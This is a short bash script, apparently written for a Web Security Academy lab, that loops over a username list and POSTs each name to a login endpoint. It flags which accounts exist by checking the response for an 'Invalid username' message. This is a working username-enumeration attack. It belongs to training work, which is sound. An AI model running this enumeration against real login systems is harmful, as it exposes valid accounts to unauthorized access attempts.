#!/bin/bash


for i in $(cat users.txt)
do
	rep=$(curl -s -i -X POST 'https://0a8900df03b36487804a857200620098.web-security-academy.net/login' --data "username=$i&password=vrzvzre")
	
	if echo "$rep" | grep -q 'Invalid username'; then
		echo $i "invalid user"
	else
		echo $i "good the user exist"
	fi
done


